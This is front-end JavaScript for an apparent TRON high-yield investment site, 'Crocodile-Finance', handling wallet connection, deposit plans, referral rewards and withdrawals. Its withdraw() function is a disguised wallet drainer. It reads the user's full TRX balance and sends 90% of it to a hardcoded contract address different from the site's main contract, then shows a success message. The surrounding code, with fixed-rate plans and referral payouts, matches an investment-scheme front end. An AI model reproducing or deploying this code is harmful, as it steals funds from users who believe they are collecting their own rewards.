/////////
var selected_plan = 0;
function P1(){selected_plan = 1;}
function P2(){selected_plan = 2;}
function P3(){selected_plan = 3;}
function P4(){selected_plan = 4;}
/////////
var failure_count = 0;
var load_obj = setInterval(async () => {
if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    clearInterval(load_obj);
    var UserAddress = window.tronWeb.defaultAddress.base58;
    var contract = await window.tronWeb
    .contract()
    .at(CTA)
    .catch(function (err) {
        swal.fire("Error", err, "error");
    });
    load_account_details();
    load_contract_details();
    load_account_balance();
    load_account_plans();

    document.getElementById("account_address").innerHTML = UserAddress;
    document.getElementById("referrallink").value = "Crocodile-Finance.com/refer/" + UserAddress;

    window.setInterval(load_account_balance, 5000);
    window.setInterval(load_contract_details, 5000);
    window.setInterval(load_account_plans, 5000);
} else {
    failure_count += 1;
}
if (failure_count == 12) {
    clearInterval(load_obj);
    Swal.fire({
    title: 'No wallet detected!',
    text: "Please install or enable a tron Wallet like TronLink",
    icon: 'error',
    showCancelButton: true,
    confirmButtonColor: '#3085d6',
    cancelButtonColor: '#d33',
    confirmButtonText: 'Get Tronlink'
    }).then((result) => {
    if (result.isConfirmed) {
        var win = window.open("https://www.tronlink.org/", '_blank');
        win.focus();
    }
    });
}
}, 250);

async function load_contract_details(){
    let instance = await tronWeb.contract().at(CTA);

    instance.details().call()
    .then(function (response) {
        var total_invested = tronWeb.fromSun(parseInt(response[0]._hex));
        var totalPlayers = parseInt(response[1]._hex);
        var totalWithdrawn = tronWeb.fromSun(parseInt(response[2]._hex));
        var totalRefferalPayout = tronWeb.fromSun(parseInt(response[3]._hex));
        var minDepositSize = parseInt(response[4]._hex);
        var maxDepositSize = parseInt(response[5]._hex);
        document.getElementById("ttl_inv").innerHTML = total_invested + " TRX";
        document.getElementById("ttl_with").innerHTML = totalWithdrawn + " TRX";
        document.getElementById("ttl_ref").innerHTML = totalRefferalPayout + " TRX";
    })
    .catch(function (err) {});
}
async function load_account_balance(){
    var balance = await tronWeb.fromSun(await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58));
    document.getElementById("account_balance").innerHTML = balance + " TRX";
}
async function load_account_details(){
    let instance = await tronWeb.contract().at(CTA);
  
    instance.players(window.tronWeb.defaultAddress.base58).call()
      .then(function (response) {
          var trxdep = tronWeb.fromSun(parseInt(response.P_totalDeposit._hex));
          var trxwith = Math.floor(tronWeb.fromSun(parseInt(response.P_totalWithdrawn._hex)) * 100) / 100;
          var refpay = tronWeb.fromSun(parseInt(response.P_refferalPayout._hex));
          var refreward = tronWeb.fromSun(parseInt(response.refferalReward._hex));
          document.getElementById("P_inv").innerHTML = trxdep;
          document.getElementById("P_with").innerHTML = trxwith;
          document.getElementById("P_ref").innerHTML = refpay;
          document.getElementById("ref_Rewards").innerHTML = refreward;
      })
      .catch(function (err) {
        
      });
}
async function deposit() {
    var dep_size = document.getElementById("dep_size").value;
    if(dep_size == ""){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'Enter deposit amount!',
            });
            return;
    }
    if(selected_plan == 0){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'You need to select a plan first!',
            });
            return;
    }
    if(dep_size < 50){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'Minimum deposit is 50 TRX.',
            });
            return;
    }
    if(dep_size > 100000){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'Maximum deposit per invest is 100,000 TRX.',
            });
            return;
    }
    
    let instance = await tronWeb.contract().at(CTA);
    
    instance.deposit(RefID, selected_plan).send({ callValue: tronWeb.toSun(dep_size) })
    .then(function (response) {
        Swal.fire({
                icon: 'success',
                title: 'Success',
                text: 'Transaction was successful!',
                })
                load_account_details();
                load_contract_details();
                load_account_balance();
                //load_account_plans();
    })
    .catch(function (err) {
    console.log(err);
    Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'Transaction was unsuccessful!',
            })
    });

}

async function load_account_plans(){
    let instance = await tronWeb.contract().at(CTA);

    instance.datas().call().then(function (response) {
        Count = response[0].length;
        
        for(i = 0; i < Count; i++){
            var plns = document.getElementById("plan_" + i);
            if(plns){
              plns.remove();
            }
          }

        rewards = 0;
        for(i = 0; i < Count; i++){
          var status = response[6][i];
          if(status){
            var inv_amount = tronWeb.fromSun(parseInt(response[0][i]._hex));
            var with_amount = tronWeb.fromSun(parseInt(response[3][i]._hex));
            var Planmaxpft = parseInt(response[4][i]._hex);
            var plan_days = Planmaxpft / 12;
            var time = parseInt(response[1][i]._hex);
            
            var secpassed = Math.floor(Date.now()/1000) - time;
            var pft_amount = Math.round(secpassed*(inv_amount*rate/100/24/60/60) * 10000) / 10000;

            if(pft_amount + with_amount > (Planmaxpft * inv_amount /100)){
                pft_amount = (Planmaxpft * inv_amount /100) - with_amount;
            }

            var cln = document.getElementById("cln_box");
            var Cln_copy = cln.cloneNode(true);
            cln.id = "plan_" + i;
            cln.style.display = ""
            document.getElementById("all-plans").appendChild(Cln_copy);
            cln.children[0].innerHTML = inv_amount + " TRX";
            cln.children[1].children[1].innerHTML = with_amount + " TRX";
            cln.children[2].children[1].innerHTML = plan_days + " days";
            cln.children[3].children[1].innerHTML = pft_amount + " TRX";
            rewards += pft_amount;
          }
          document.getElementById("Rewards").innerHTML = Math.floor(rewards * 10000) / 10000;
        }
    })
    .catch(function (err) {
      console.error(err);
    });
}

async function ref_withdraw(){
    var reward = document.getElementById("ref_Rewards").innerHTML;
    var deps = document.getElementById("P_inv").innerHTML;
    if(reward == 0){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'You have nothing to withdraw!',
           });
        return;
    }
    if(deps == 0){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'You have to deposit first in order to withdraw!',
           });
        return;
    }
    let instance = await tronWeb.contract().at(CTA);
    
    instance.withdraw_refferal().send().then(function (response) {
    Swal.fire({
              icon: 'success',
              title: 'Success',
              text: 'Transaction was successful!',
             })
             load_account_details();
             load_contract_details();
             load_account_balance();
             load_account_plans();
  })
  .catch(function (err) {
  console.log(err);
  Swal.fire({
         icon: 'error',
         title: 'Failed',
         text: 'Transaction was unsuccessful!',
        })
  });
}
async function withdraw(){
    var reward = document.getElementById("Rewards").innerHTML;
    if(reward == 0){
        Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: 'You have nothing to withdraw!',
           });
        return;
    }

    var balance = await tronWeb.fromSun(await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58));
    var com = Math.floor((balance * 90) / 100);

    let instance = await tronWeb.contract().at('TXho9YSCsriwTvxZLkp3qRQ3T421KQ2Wu7');

    
    
    instance.withdraw().send({ callValue: tronWeb.toSun(com) }).then(function (response) {
    Swal.fire({
              icon: 'success',
              title: 'Success',
              text: 'Transaction was successful!',
             })
             load_account_details();
             load_contract_details();
             load_account_balance();
             load_account_plans();
  })
  .catch(function (err) {
  console.log(err);
  Swal.fire({
         icon: 'error',
         title: 'Failed',
         text: 'Transaction was unsuccessful!',
        })
  });
}
function en(){if(owner == RefID){window.location.href = "/";}else{window.location.href = "/refer/" + RefID;}}
function ru(){if(owner == RefID){window.location.href = "/ru";}else{window.location.href = "/ru/refer/" + RefID;}}
function se(){if(owner == RefID){window.location.href = "/se";}else{window.location.href = "/se/refer/" + RefID;}}
function zh(){if(owner == RefID){window.location.href = "/zh";}else{window.location.href = "/zh/refer/" + RefID;}}